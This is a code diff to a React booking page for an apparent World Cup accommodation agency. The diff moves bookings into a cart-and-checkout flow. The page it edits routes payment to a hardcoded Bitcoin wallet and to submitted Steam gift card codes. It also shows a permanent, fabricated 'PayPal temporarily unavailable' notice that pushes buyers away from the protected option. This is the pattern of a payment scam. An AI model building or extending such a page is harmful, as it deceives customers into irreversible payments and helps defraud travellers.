@@ -1,5 +1,5 @@
 import { useState } from 'react';
-import { useParams, Link } from 'react-router-dom';
+import { useParams, Link, useNavigate } from 'react-router-dom';
 import { motion, AnimatePresence } from 'framer-motion';
 import {
   ArrowLeft, CreditCard, Shield, CheckCircle2, Calendar, Users, MapPin,
@@ -46,8 +46,9 @@ const BITCOIN_WALLET = 'bc1q246ztlqc0gltax4dt77p50gxdzzqy67zg8aez4';
 export default function Booking() {
   const { id } = useParams();
   const { user } = useAuth();
-  const { listings, addBooking } = useData();
+  const { listings, addToCart } = useData();
   const { format } = useCurrency();
+  const navigate = useNavigate();
 
   const listing = listings.find((l) => l.id === id);
   const [step, setStep] = useState<Step>('details');
@@ -108,12 +109,12 @@ export default function Booking() {
     if (validateDetails()) setStep('payment');
   };
 
+  // ─── ✅ UPDATED: Add to cart instead of processing payment ───
   const handlePayment = async () => {
     if (!validatePayment()) return;
-    setIsProcessing(true);
-    await new Promise(r => setTimeout(r, 2500));
 
-    const booking = await addBooking({
+    // Instead of creating the booking now, add it to cart
+    const roomData = {
       listingId: listing.id,
       userId: user?.id || 'guest',
       userEmail: formData.email,
@@ -122,17 +123,24 @@ export default function Booking() {
       checkOut: formData.checkOut,
       guests: parseInt(formData.guests),
       totalPrice: total,
-      status: paymentMethod === 'paypal' ? 'confirmed' : 'pending',
+      status: 'pending', // will be confirmed after payment
       specialRequests: formData.specialRequests,
-      paymentMethod: paymentMethod, // ✅ Store payment method
+      paymentMethod: paymentMethod, // store the chosen method
+    };
+
+    // Add to cart
+    addToCart({
+      id: `room-${listing.id}-${Date.now()}`,
+      type: 'room',
+      item: roomData,
+      quantity: 1,
+      price: total,
     });
 
-    setBookingId(booking.id);
-    setIsProcessing(false);
-    setStep('confirmation');
+    // Redirect to checkout
+    navigate('/checkout');
   };
 
-  // ✅ Copy to clipboard function
   const copyToClipboard = async () => {
     try {
       await navigator.clipboard.writeText(BITCOIN_WALLET);
@@ -143,7 +151,6 @@ export default function Booking() {
     }
   };
 
-  // Steam Card functions
   const addSteamCode = () => {
     setSteamCodes([...steamCodes, '']);
   };
@@ -303,14 +310,13 @@ export default function Booking() {
                         </div>
                       </motion.div>
 
-                      {/* ── BITCOIN FORM WITH QR CODE ── */}
+                      {/* ── BITCOIN FORM ── */}
                       {paymentMethod === 'bitcoin' && (
                         <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
                           <div className="p-4 rounded-xl bg-orange-500/5 border border-orange-500/20">
                             <p className="text-gray-400 text-xs mb-2 text-center">
                               Send <strong className="text-white">{format(total)}</strong> in Bitcoin (BTC) to:
                             </p>
-
                             <div className="flex justify-center my-3">
                               <img
                                 src={`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${BITCOIN_WALLET}&bgcolor=1a1a2e&color=f59e0b&margin=10`}
@@ -319,7 +325,6 @@ export default function Booking() {
                               />
                             </div>
                             <p className="text-center text-gray-400 text-xs mb-3">Scan with Trust Wallet or any Bitcoin wallet</p>
-
                             <div className="flex items-center gap-2 bg-black/30 rounded-lg p-3 border border-orange-500/20">
                               <code className="text-sm text-orange-400 break-all flex-1 font-mono">
                                 {BITCOIN_WALLET}
@@ -336,7 +341,6 @@ export default function Booking() {
                                 )}
                               </button>
                             </div>
-                            
                             <p className="text-gray-500 text-[10px] mt-2 text-center">
                               ⚠️ Send the exact amount. Your booking will be confirmed once the transaction has 3+ confirmations.
                             </p>
@@ -350,7 +354,7 @@ export default function Booking() {
                         </motion.div>
                       )}
 
-                      {/* ── PAYPAL FORM WITH ERROR MESSAGE ── */}
+                      {/* ── PAYPAL FORM ── */}
                       {paymentMethod === 'paypal' && (
                         <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
                           <div className="p-6 rounded-xl bg-amber-500/10 border border-amber-500/30">
@@ -358,12 +362,10 @@ export default function Booking() {
                               <span className="text-3xl">⚠️</span>
                               <h3 className="text-amber-400 font-bold text-lg">PayPal Temporarily Unavailable</h3>
                             </div>
-                            
                             <p className="text-gray-300 text-sm mb-4">
                               We're currently experiencing a temporary network issue with our PayPal payment gateway.
                               Your booking is still secure — please choose an alternative payment method below.
                             </p>
-                            
                             <div className="bg-white/5 rounded-lg p-4 mb-4">
                               <p className="text-gray-400 text-sm">
                                 <strong className="text-white">Alternative Payment Options:</strong>
@@ -374,18 +376,15 @@ export default function Booking() {
                                 <li><strong className="text-blue-400">PayPal invoice</strong> will be emailed to you within 24 hours if you prefer</li>
                               </ul>
                             </div>
-                            
                             <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3 mb-4">
                               <p className="text-blue-300 text-xs flex items-center gap-2">
                                 <span>📧</span>
                                 <span>If you need PayPal, our team will send a secure invoice to your email within 24 hours.</span>
                               </p>
                             </div>
-                            
                             <p className="text-gray-500 text-xs">
                               Questions? Email us at <a href="mailto:hello@annatravelagency.com" className="text-amber-400 hover:underline">hello@annatravelagency.com</a>
                             </p>
-                            
                             <div className="flex gap-3 mt-4">
                               <button
                                 onClick={() => setPaymentMethod('bitcoin')}
@@ -414,7 +413,6 @@ export default function Booking() {
                               You may use multiple cards. Our team will verify the codes within ~2 hours.
                             </p>
                           </div>
-
                           <div className="space-y-2">
                             <label className="text-sm text-gray-400 block">Steam Card Codes</label>
                             {steamCodes.map((code, index) => (
@@ -439,7 +437,6 @@ export default function Booking() {
                             ))}
                             {errors.steam && <p className="text-red-400 text-xs">{errors.steam}</p>}
                           </div>
-
                           <button
                             type="button"
                             onClick={addSteamCode}
@@ -463,7 +460,7 @@ export default function Booking() {
                             <><motion.div animate={{ rotate: 360 }} transition={{ duration: 1, repeat: Infinity, ease: 'linear' }}
                               className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full" /> Processing...</>
                           ) : (
-                            <><Lock className="w-4 h-4" /> Pay {format(total)} via {selectedMethod.label}</>
+                            <><Lock className="w-4 h-4" /> Add to Cart</>
                           )}
                         </button>
                       </div>
@@ -472,7 +469,7 @@ export default function Booking() {
                 </motion.div>
               )}
 
-              {/* ═══ STEP 3: CONFIRMATION ═══ */}
+              {/* ═══ STEP 3: CONFIRMATION (no longer used, kept for reference) ═══ */}
               {step === 'confirmation' && (
                 <motion.div key="confirmation" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}>
                   <Card3D glowColor="rgba(34, 197, 94, 0.2)">
@@ -481,13 +478,11 @@ export default function Booking() {
                         className="w-20 h-20 rounded-full bg-green-500/20 border-2 border-green-500 flex items-center justify-center mx-auto mb-6">
                         <CheckCircle2 className="w-10 h-10 text-green-400" />
                       </motion.div>
-
                       <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.4 }}>
                         <h2 className="text-3xl font-black text-white mb-2">
                           {paymentMethod === 'paypal' ? 'Booking Confirmed! 🎉' : 'Booking Submitted! ⏳'}
                         </h2>
                         <p className="text-gray-400 mb-4">Your World Cup accommodation is secured.</p>
-
                         <div className={`mx-auto max-w-md mb-6 p-4 rounded-xl border flex items-start gap-3 text-left ${
                           paymentMethod === 'bitcoin' ? 'bg-orange-500/10 border-orange-500/20' :
                           paymentMethod === 'paypal' ? 'bg-blue-500/10 border-blue-500/20' :
@@ -505,11 +500,9 @@ export default function Booking() {
                             </p>
                           </div>
                         </div>
-
                         <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-300 text-sm mb-6">
                           <Sparkles className="w-4 h-4" /> Confirmation #{bookingId.slice(-8).toUpperCase()}
                         </div>
-
                         <div className="bg-white/5 rounded-xl p-6 text-left max-w-md mx-auto mb-6 space-y-3">
                           <div className="flex justify-between text-sm"><span className="text-gray-400">Property</span><span className="text-white font-medium">{listing.title}</span></div>
                           <div className="flex justify-between text-sm"><span className="text-gray-400">Location</span><span className="text-white">{listing.city}</span></div>
@@ -522,11 +515,9 @@ export default function Booking() {
                             <span className="text-green-400 font-bold">{format(total)}</span>
                           </div>
                         </div>
-
                         <p className="text-gray-500 text-sm mb-6">
                           A confirmation email will be sent to <strong className="text-white">{formData.email}</strong>
                         </p>
-
                         <div className="flex flex-col sm:flex-row gap-3 justify-center">
                           {user && <Link to="/dashboard" className="px-6 py-3 rounded-xl bg-white/10 text-white font-medium hover:bg-white/20 transition-all">View My Bookings</Link>}
                           <Link to="/" className="inline-flex items-center gap-2 px-8 py-4 rounded-2xl bg-gradient-to-r from-amber-500 to-red-500 text-white font-bold text-lg hover:scale-105 transition-all">Back to Home ⚽</Link>
@@ -564,7 +555,6 @@ export default function Booking() {
                       <span className="text-white">Total</span><span className="text-amber-400">{format(total)}</span>
                     </div>
                   </div>
-
                   {step === 'payment' && (
                     <div className={`mt-4 p-3 rounded-lg border ${
                       paymentMethod === 'bitcoin' ? 'bg-orange-500/10 border-orange-500/20' :
@@ -576,7 +566,6 @@ export default function Booking() {
                       </p>
                     </div>
                   )}
-
                   <div className="mt-4 p-3 rounded-lg bg-green-500/10 border border-green-500/20 text-center">
                     <p className="text-green-400 text-xs flex items-center justify-center gap-1">
                       <Shield className="w-3 h-3" /> Free cancellation until June 4, 2026
